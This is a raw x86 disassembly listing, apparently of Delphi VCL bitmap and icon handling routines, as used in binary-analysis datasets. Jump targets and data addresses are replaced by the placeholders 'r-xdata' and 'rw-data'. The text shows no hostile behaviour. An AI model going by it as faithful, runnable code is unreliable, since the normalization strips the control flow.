mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_422013
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41f3e0
mov [ ebp - 0x30 ] eax
sub_422030
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4219e4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422074
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_421774
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_416858
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4219e4
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_421b0c
call sub_41ebdc
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4220e4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_421774
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_420d8c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42217f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4219e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4221a8
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_421630
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_421774
mov eax esi
call sub_421884
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_421774
mov eax esi
call sub_421884
mov eax esi
call sub_421700
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_420d8c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_421190
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4219e4
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4219e4
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_420728
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4222e0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_421784
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421190
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422334
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_421784
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_421190
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4223b4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_421774
mov eax ebx
call sub_421784
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_420728
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42244b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4219e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420620
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41cc28
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_422450
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a30
call sub_403a84
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420620
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422488
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_421784
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421190
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4224e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402ca4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_421700
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41fb1c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_416890
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_416890
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402ca4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4215c4
mov dl [ r-xdata ]
call sub_41e9d8
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41ecf0
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4206dc
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_416890
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_416890
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_416890
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_416890
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_416890
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_416890
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41f160
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_416890
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41f484
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_4227a4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_421784
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_420728
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42281e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_420d8c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422844
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42288c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41fe58
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_420554
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4228e0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_420558
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414740
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_422910
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_422be8
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_420554
mov eax [ esi + 0x28 ]
call sub_420558
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41476c
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_422970
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41e9d8
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4229c8
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_422a04
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41664c
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_416858
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41f730
jmp r-xdata
jmp r-xdata
call sub_41ebe8
sub_422a7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422b09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4229c8
cmp eax [ rw-data ]
jne r-xdata
call sub_41ebe8
mov eax esi
call sub_4229c8
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41fc5c
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402ca4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_416890
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_422b30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422bbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41662c
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_416858
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_416858
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_422be8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41ebe8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422bc3
mov eax [ ebp - 0x4 ]
call sub_403294
call sub_403a30
call sub_403a84
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422be8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422c28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420554
mov eax [ ebx + 0x28 ]
call sub_420558
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422ca8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_422a7c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_416890
pop esi
pop ebx
retn
sub_422cf8
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41f230
mov [ rw-data ] eax
pop ebx
retn
sub_422d30
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_422d74
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_422d30
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_422e40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_422e78
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_423070
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_422ebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422ea4
xor eax eax
push ebp
push sub_422f5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f64
mov eax [ ebp - 0x4 ]
call sub_422eb0
retn
mov eax 0x10
call sub_4026e4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422f70
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_422f70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42304f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4215c4
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41e2a0
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41e184
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412d08
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41e528
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41e8bc
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_421280
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423070
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_422ea4
xor eax eax
push ebp
push sub_4230bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230c2
mov eax [ ebp - 0x4 ]
call sub_422eb0
retn
mov esp ebp
pop ebp
retn
sub_4230c2
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402704
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403294
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_422ea4
xor eax eax
push ebp
push sub_4230bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230c2
mov eax [ ebp - 0x4 ]
call sub_422eb0
retn
mov esp ebp
pop ebp
retn
sub_4230e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41d4f8
push eax
mov eax ebx
call sub_41d4f8
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_422ebc
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_423120
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4231e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
